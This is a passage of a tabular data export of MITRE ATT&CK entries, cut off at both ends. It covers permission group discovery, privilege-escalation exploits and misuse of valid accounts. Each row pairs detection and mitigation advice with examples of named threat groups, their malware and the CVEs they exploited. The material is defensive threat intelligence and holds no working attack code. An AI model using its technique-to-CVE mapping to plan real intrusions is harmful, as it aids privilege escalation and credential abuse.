'Windows XP']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1069'],['Permission Groups Discovery'],https://attack.mitre.org/wiki/Technique/T1069
1260,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['576'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands such as <code>net group</code> and <code>net localgroup</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate groups.[[CiteRef::Savill 1999]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about groups and permissions, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1069'],['Permission Groups Discovery'],https://attack.mitre.org/wiki/Technique/T1069
1261,"['Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Software and operating system crash reports may contain useful contextual information about attempted exploits that correlate with other malicious activity. Exploited processes may exhibit behavior that is unusual for the specific process, such as spawning additional processes or reading and writing to files.']","['Anti-virus', 'System access controls']",['69'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Error Reporting', 'File monitoring', 'Process monitoring']",['[[Software/S0125|Remsec]] has a plugin to drop and execute vulnerable Outpost Sandbox or avast! Virtualization drivers in order to gain kernel mode privileges.[[CiteRef::Kaspersky ProjectSauron Technical Analysis]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Update software regularly by employing patch management for internal enterprise endpoints and servers. Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization. Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing, virtualization, and exploit prevention tools such as the Microsoft Enhanced Mitigation Experience Toolkit.[[CiteRef::SRD EMET]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Unpatched software or otherwise vulnerable target. Depending on the target and goal, the system and exploitable service may need to be remotely accessible from the internal network. In the case of privilege escalation, the adversary likely already has user permissions on the target system.']","Software: Remsec, Backdoor.Remsec, ProjectSauron","['Credential Access', 'Defense Evasion', 'Lateral Movement', 'Privilege Escalation']",['Technique/T1068'],['Exploitation of Vulnerability'],https://attack.mitre.org/wiki/Technique/T1068
1262,"['Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Software and operating system crash reports may contain useful contextual information about attempted exploits that correlate with other malicious activity. Exploited processes may exhibit behavior that is unusual for the specific process, such as spawning additional processes or reading and writing to files.']","['Anti-virus', 'System access controls']",['69'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Error Reporting', 'File monitoring', 'Process monitoring']",['[[Software/S0044|JHUHUGIT]] has exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges.[[CiteRef::ESET Sednit Part 1]][[CiteRef::ESET Sednit July 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Update software regularly by employing patch management for internal enterprise endpoints and servers. Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization. Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing, virtualization, and exploit prevention tools such as the Microsoft Enhanced Mitigation Experience Toolkit.[[CiteRef::SRD EMET]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Unpatched software or otherwise vulnerable target. Depending on the target and goal, the system and exploitable service may need to be remotely accessible from the internal network. In the case of privilege escalation, the adversary likely already has user permissions on the target system.']","Software: JHUHUGIT, Seduploader, ...","['Credential Access', 'Defense Evasion', 'Lateral Movement', 'Privilege Escalation']",['Technique/T1068'],['Exploitation of Vulnerability'],https://attack.mitre.org/wiki/Technique/T1068
1263,"['Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Software and operating system crash reports may contain useful contextual information about attempted exploits that correlate with other malicious activity. Exploited processes may exhibit behavior that is unusual for the specific process, such as spawning additional processes or reading and writing to files.']","['Anti-virus', 'System access controls']",['69'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Error Reporting', 'File monitoring', 'Process monitoring']","['[[Group/G0007|APT28]] has used CVE-2014-4076, CVE-2015-2387, and CVE-2015-1701 to escalate privileges, as well as CVE-2015-4902 to bypass security features.[[CiteRef::Bitdefender APT28 Dec 2015]][[CiteRef::Microsoft SIR Vol 19]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Update software regularly by employing patch management for internal enterprise endpoints and servers. Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization. Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing, virtualization, and exploit prevention tools such as the Microsoft Enhanced Mitigation Experience Toolkit.[[CiteRef::SRD EMET]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Unpatched software or otherwise vulnerable target. Depending on the target and goal, the system and exploitable service may need to be remotely accessible from the internal network. In the case of privilege escalation, the adversary likely already has user permissions on the target system.']",[],"['Credential Access', 'Defense Evasion', 'Lateral Movement', 'Privilege Escalation']",['Technique/T1068'],['Exploitation of Vulnerability'],https://attack.mitre.org/wiki/Technique/T1068
1264,"['Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Software and operating system crash reports may contain useful contextual information about attempted exploits that correlate with other malicious activity. Exploited processes may exhibit behavior that is unusual for the specific process, such as spawning additional processes or reading and writing to files.']","['Anti-virus', 'System access controls']",['69'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Error Reporting', 'File monitoring', 'Process monitoring']",['[[Group/G0050|APT32]] has used CVE-2016-7255 to escalate privileges.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Update software regularly by employing patch management for internal enterprise endpoints and servers. Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization. Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing, virtualization, and exploit prevention tools such as the Microsoft Enhanced Mitigation Experience Toolkit.[[CiteRef::SRD EMET]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Unpatched software or otherwise vulnerable target. Depending on the target and goal, the system and exploitable service may need to be remotely accessible from the internal network. In the case of privilege escalation, the adversary likely already has user permissions on the target system.']",[],"['Credential Access', 'Defense Evasion', 'Lateral Movement', 'Privilege Escalation']",['Technique/T1068'],['Exploitation of Vulnerability'],https://attack.mitre.org/wiki/Technique/T1068
1265,"['Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Software and operating system crash reports may contain useful contextual information about attempted exploits that correlate with other malicious activity. Exploited processes may exhibit behavior that is unusual for the specific process, such as spawning additional processes or reading and writing to files.']","['Anti-virus', 'System access controls']",['69'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Error Reporting', 'File monitoring', 'Process monitoring']","['[[Group/G0037|FIN6]] has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.[[CiteRef::FireEye FIN6 April 2016]]']",['FIN6'],['FIN6'],['G0037'],"['Update software regularly by employing patch management for internal enterprise endpoints and servers. Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization. Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing, virtualization, and exploit prevention tools such as the Microsoft Enhanced Mitigation Experience Toolkit.[[CiteRef::SRD EMET]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Unpatched software or otherwise vulnerable target. Depending on the target and goal, the system and exploitable service may need to be remotely accessible from the internal network. In the case of privilege escalation, the adversary likely already has user permissions on the target system.']",[],"['Credential Access', 'Defense Evasion', 'Lateral Movement', 'Privilege Escalation']",['Technique/T1068'],['Exploitation of Vulnerability'],https://attack.mitre.org/wiki/Technique/T1068
1266,"['Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Software and operating system crash reports may contain useful contextual information about attempted exploits that correlate with other malicious activity. Exploited processes may exhibit behavior that is unusual for the specific process, such as spawning additional processes or reading and writing to files.']","['Anti-virus', 'System access controls']",['69'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Error Reporting', 'File monitoring', 'Process monitoring']",['[[Software/S0050|CosmicDuke]] attempts to exploit privilege escalation vulnerabilities CVE-2010-0232 or CVE-2010-4398.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Update software regularly by employing patch management for internal enterprise endpoints and servers. Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization. Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing, virtualization, and exploit prevention tools such as the Microsoft Enhanced Mitigation Experience Toolkit.[[CiteRef::SRD EMET]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Unpatched software or otherwise vulnerable target. Depending on the target and goal, the system and exploitable service may need to be remotely accessible from the internal network. In the case of privilege escalation, the adversary likely already has user permissions on the target system.']","Software: CosmicDuke, TinyBaron, ...","['Credential Access', 'Defense Evasion', 'Lateral Movement', 'Privilege Escalation']",['Technique/T1068'],['Exploitation of Vulnerability'],https://attack.mitre.org/wiki/Technique/T1068
1267,"['Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Software and operating system crash reports may contain useful contextual information about attempted exploits that correlate with other malicious activity. Exploited processes may exhibit behavior that is unusual for the specific process, such as spawning additional processes or reading and writing to files.']","['Anti-virus', 'System access controls']",['69'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Error Reporting', 'File monitoring', 'Process monitoring']",['[[Group/G0027|Threat Group-3390]] has used CVE-2014-6324 to escalate privileges.[[CiteRef::SecureWorks BRONZE UNION June 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Update software regularly by employing patch management for internal enterprise endpoints and servers. Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization. Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing, virtualization, and exploit prevention tools such as the Microsoft Enhanced Mitigation Experience Toolkit.[[CiteRef::SRD EMET]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Unpatched software or otherwise vulnerable target. Depending on the target and goal, the system and exploitable service may need to be remotely accessible from the internal network. In the case of privilege escalation, the adversary likely already has user permissions on the target system.']",[],"['Credential Access', 'Defense Evasion', 'Lateral Movement', 'Privilege Escalation']",['Technique/T1068'],['Exploitation of Vulnerability'],https://attack.mitre.org/wiki/Technique/T1068
1268,"['Configure robust, consistent account activity audit policies across the enterprise.[[CiteRef::TechNet Audit Policy]] Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.']","['Anti-virus', 'Firewall', 'Host intrusion prevention systems', 'Network intrusion detection system', 'Process whitelisting', 'System access controls']",['560'],[],"['Authentication logs', 'Process monitoring']",['[[Group/G0011|PittyTiger]] attempts to obtain legitimate credentials during operations.[[CiteRef::Bizeul 2014]]'],['PittyTiger'],['PittyTiger'],['G0011'],"['Take measures to detect or prevent techniques such as [[Technique/T1003|Credential Dumping]] or installation of keyloggers to acquire credentials through [[Technique/T1056|Input Capture]]. Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.[[CiteRef::Microsoft Securing Privileged Access]]. Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.[[CiteRef::TechNet Credential Theft]][[CiteRef::TechNet Least Privilege]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1078'],['Valid Accounts'],https://attack.mitre.org/wiki/Technique/T1078
1269,"['Configure robust, consistent account activity audit policies across the enterprise.[[CiteRef::TechNet Audit Policy]] Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.']","['Anti-virus', 'Firewall', 'Host intrusion prevention systems', 'Network intrusion detection system', 'Process whitelisting', 'System access controls']",['560'],[],"['Authentication logs', 'Process monitoring']",['[[Group/G0008|Carbanak]] actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.[[CiteRef::Kaspersky Carbanak]]'],['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],"['Take measures to detect or prevent techniques such as [[Technique/T1003|Credential Dumping]] or installation of keyloggers to acquire credentials through [[Technique/T1056|Input Capture]]. Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.[[CiteRef::Microsoft Securing Privileged Access]]. Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.[[CiteRef::TechNet Credential Theft]][[CiteRef::TechNet Least Privilege]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1078'],['Valid Accounts'],https://attack.mitre.org/wiki/Technique/T1078
1270,"['Configure robust, consistent account activity audit policies across the enterprise.[[CiteRef::TechNet Audit Policy]] Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.']","['Anti-virus', 'Firewall', 'Host intrusion prevention systems', 'Network intrusion detection system', 'Process whitelisting', 'System access controls']",['560'],[],"['Authentication logs', 'Process monitoring']",['[[Group/G0026|APT18]] actors leverage legitimate credentials to log into external remote services.[[CiteRef::RSA2017 Detect and Respond Adair]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Take measures to detect or prevent techniques such as [[Technique/T1003|Credential Dumping]] or installation of keyloggers to acquire credentials through [[Technique/T1056|Input Capture]]. Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.[[CiteRef::Microsoft Securing Privileged Access]]. Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.[[CiteRef::TechNet Credential Theft]][[CiteRef::TechNet Least Privilege]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1078'],['Valid Accounts'],https://attack.mitre.org/wiki/Technique/T1078
1271,"['Configure robust, consistent account activity audit policies across the enterprise.[[CiteRef::TechNet Audit Policy]] Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.']","['Anti-virus', 'Firewall', 'Host intrusion prevention systems', 'Network intrusion detection system', 'Process whitelisting', 'System access controls']",['560'],[],"['Authentication logs', 'Process monitoring']",['[[Group/G0007|APT28]] has used legitimate credentials to maintain access to a victim network and exfiltrate data.[[CiteRef::Trend Micro Pawn Storm April 2017]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Take measures to detect or prevent techniques such as [[Technique/T1003|Credential Dumping]] or installation of keyloggers to acquire credentials through [[Technique/T1056|Input Capture]]. Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.[[CiteRef::Microsoft Securing Privileged Access]]. Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.[[CiteRef::TechNet Credential Theft]][[CiteRef::TechNet Least Privilege]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1078'],['Valid Accounts'],https://attack.mitre.org/wiki/Technique/T1078
1272,"['Configure robust, consistent account activity audit policies across the enterprise.[[CiteRef::TechNet Audit Policy]] Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.']","['Anti-virus', 'Firewall', 'Host intrusion prevention systems', 'Network intrusion detection system', 'Process whitelisting', 'System access controls']",['560'],[],"['Authentication logs', 'Process monitoring']","[""[[Group/G0028|Threat Group-1314]] actors used compromised credentials for the victim's endpoint management platform, Altiris, to move laterally.[[CiteRef::Dell TG-1314]]""]",['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],"['Take measures to detect or prevent techniques such as [[Technique/T1003|Credential Dumping]] or installation of keyloggers to acquire credentials through [[Technique/T1056|Input Capture]]. Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.[[CiteRef::Microsoft Securing Privileged Access]]. Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.[[CiteRef::TechNet Credential Theft]][[CiteRef::TechNet Least Privilege]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1078'],['Valid Accounts'],https://attack.mitre.org/wiki/Technique/T1078
1273,"['Configure robust, consistent account activity audit policies across the enterprise.[[CiteRef::TechNet Audit Policy]] Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.']","['Anti-virus', 'Firewall', 'Host intrusion prevention systems', 'Network intrusion detection system', 'Process whitelisting', 'System access controls']",['560'],[],"['Authentication logs', 'Process monitoring']",['[[Group/G0039|Suckfly]] used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.[[CiteRef::Symantec Suckfly May 2016]]'],['Suckfly'],['Suckfly'],['G0039'],"['Take measures to detect or prevent techniques such as [[Technique/T1003|Credential Dumping]] or installation of keyloggers to acquire credentials through [[Technique/T1056|Input Capture]]. Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.[[CiteRef::Microsoft Securing Privileged Access]]. Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.[[CiteRef::TechNet Credential Theft]][[CiteRef::TechNet Least Privilege]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1078'],['Valid Accounts'],https://attack.mitre.org/wiki/Technique/T1078
1274,"['Configure robust, consistent account activity audit policies across the enterprise.[[CiteRef::TechNet Audit Policy]] Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.']","['Anti-virus', 'Firewall', 'Host intrusion prevention systems', 'Network intrusion detection system', 'Process whitelisting', 'System access controls']",['560'],[],"['Authentication logs', 'Process monitoring']",['[[Group/G0051|FIN10]] has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor. The group has also moved laterally using the Local Administrator account.[[CiteRef::FireEye FIN10 June 2017]]'],['FIN10'],['FIN10'],['G0051'],"['Take measures to detect or prevent techniques such as [[Technique/T1003|Credential Dumping]] or installation of keyloggers to acquire credentials through [[Technique/T1056|Input Capture]]. Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.[[CiteRef::Microsoft Securing Privileged Access]]. Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.[[CiteRef::TechNet Credential Theft]][[CiteRef::TechNet Least Privilege]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1078'],['Valid Accounts'],https://attack.mitre.org/wiki/Technique/T1078
1275,"['Configure robust, consistent account activity audit policies across the enterprise.[[CiteRef::TechNet Audit Policy]] Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.']","['Anti-virus', 'Firewall', 'Host intrusion prevention systems', 'Network intrusion detection system', 'Process whitelisting', 'System access controls']",['560'],[],"['Authentication logs', 'Process monitoring']",['[[Software/S0154|Cobalt Strike]] can use known credentials to run commands and spawn processes as another user.[[CiteRef::cobaltstrike manual]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Take measures to detect or prevent techniques such as [[Technique/T1003|Credential Dumping]] or installation of keyloggers to acquire credentials through [[Technique/T1056|Input Capture]]. Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.[[CiteRef::Microsoft Securing Privileged Access]]. Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.[[CiteRef::TechNet Credential Theft]][[CiteRef::TechNet Least Privilege]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows 